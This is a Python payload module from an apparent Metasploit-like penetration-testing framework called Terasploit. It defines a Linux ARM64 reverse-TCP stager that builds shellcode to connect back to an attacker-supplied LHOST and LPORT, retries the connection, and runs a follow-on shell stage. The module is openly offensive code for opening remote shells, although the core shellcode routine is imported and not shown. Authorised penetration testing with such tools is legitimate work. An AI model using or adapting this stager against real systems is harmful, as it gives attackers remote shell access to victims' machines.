"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            modules/payload/stagers/linux/aarch64/shell/reverse_tcp.py
"""

from teralibs.tsf.base.payload import (
    ARCH_AARCH64,
    PLATFORM_LINUX,
    STAGER,
    Payload,
    PayloadHandler,
)
from teralibs.tsf.core.payload.linux.aarch64.reverse_tcp import ReverseTcpAarch64


class TerasploitModule(ReverseTcpAarch64, Payload):
    """Linux AArch64 reverse-TCP stager."""

    NAME = "Linux AArch64 Reverse TCP Stager"
    DESCRIPTION = (
        "Linux AArch64 (ARM64) stager that opens a reverse TCP channel to the "
        "attacker and executes the companion stage delivered by the framework."
    )
    AUTHOR = "4steroth"
    LICENSE = "BSD-3-CLAUSE"
    VERSION = "1.0"
    RANK = "normal"
    REFERENCES = [
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "modules/payloads/stagers/linux/aarch64/reverse_tcp.rb",
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "lib/msf/core/payload/linux/aarch64/reverse_tcp.rb",
    ]

    PAYLOAD_TYPE = STAGER
    HANDLER = PayloadHandler.ReverseTCP

    # Companion stage: modules/payload/stages/linux/aarch64/shell.py
    STAGE_PATH = "linux.aarch64.shell"

    CACHED_SIZE = 208
    MAX_SIZE = 512

    ARCH = [ARCH_AARCH64]
    PLATFORM = [PLATFORM_LINUX]

    OPTIONS = ["LHOST", "LPORT", "BADCHARS"]

    def generate(self, ctx):
        """
        Generate the Linux AArch64 reverse-TCP stager shellcode.
        """
        host = ctx.get_option("LHOST")
        port = int(ctx.get_option("LPORT"))

        retry_count = int(ctx.get_option("StagerRetryCount") or 10)
        sleep_seconds = float(ctx.get_option("StagerRetryWait") or 5.0)

        exitfunc = str(ctx.get_option("EXITFUNC") or "process").lower().strip()

        shellcode = self.generate_reverse_tcp(
            host_option=(host, port, exitfunc),
            retry_count=retry_count,
            sleep_seconds=sleep_seconds,
        )

        shellcode = self.apply_prepends(shellcode, ctx)
        return shellcode
